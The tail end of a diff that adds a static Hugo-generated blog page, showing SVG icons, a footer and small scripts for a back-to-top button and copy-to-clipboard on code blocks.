+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
